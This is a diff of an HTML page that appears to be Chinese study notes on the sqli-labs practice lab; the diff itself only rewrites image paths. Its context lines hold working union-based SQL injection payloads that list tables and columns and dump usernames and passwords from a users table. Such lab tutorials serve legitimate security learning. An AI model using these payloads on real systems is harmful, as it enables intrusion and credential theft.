@@ -394,28 +394,28 @@ group_concat()函数可以让多个数据在一行显示，但是只能显示64�
 information_schema.schemata limit 0,1--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
-<p><img src="/.io//Users\hlh\AppData\Roaming\Typora\typora-user-images\image-20221115171630607.png" alt="image-20221115171630607"></p>
+<p><img src="/2022/11/30/Day07/Users\hlh\AppData\Roaming\Typora\typora-user-images\image-20221115171630607.png" alt="image-20221115171630607"></p>
 </blockquote>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">爆破表名
 ?id&#x3D;-1&#39; union select 1,2,group_concat(table_name)from information_schema.tables
 where table_schema&#x3D;database()--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
-<p><img src="/.io//Users\hlh\AppData\Roaming\Typora\typora-user-images\image-20221115171713650.png" alt="image-20221115171713650"></p>
+<p><img src="/2022/11/30/Day07/Users\hlh\AppData\Roaming\Typora\typora-user-images\image-20221115171713650.png" alt="image-20221115171713650"></p>
 </blockquote>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">爆破字段名
 ?id&#x3D;-1&#39; union select 1,2,group_concat(column_name)from
 information_schema.columns where table_name&#x3D;&#39;users&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
-<p><img src="/.io//Users\hlh\AppData\Roaming\Typora\typora-user-images\image-20221115173051680.png" alt="image-20221115173051680"></p>
+<p><img src="/2022/11/30/Day07/Users\hlh\AppData\Roaming\Typora\typora-user-images\image-20221115173051680.png" alt="image-20221115173051680"></p>
 </blockquote>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">爆破字段
 ?id&#x3D;-1&#39; union select 1,2,(select group_concat(username,0x7e,password)from
 users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
-<p><img src="/.io//Users\hlh\AppData\Roaming\Typora\typora-user-images\image-20221115174526906.png" alt="image-20221115174526906"></p>
+<p><img src="/2022/11/30/Day07/Users\hlh\AppData\Roaming\Typora\typora-user-images\image-20221115174526906.png" alt="image-20221115174526906"></p>
 </blockquote>
 <p><strong>Less2</strong></p>
 <p>和1大致相同 less1的注入点是字符型 2则是数字型</p>
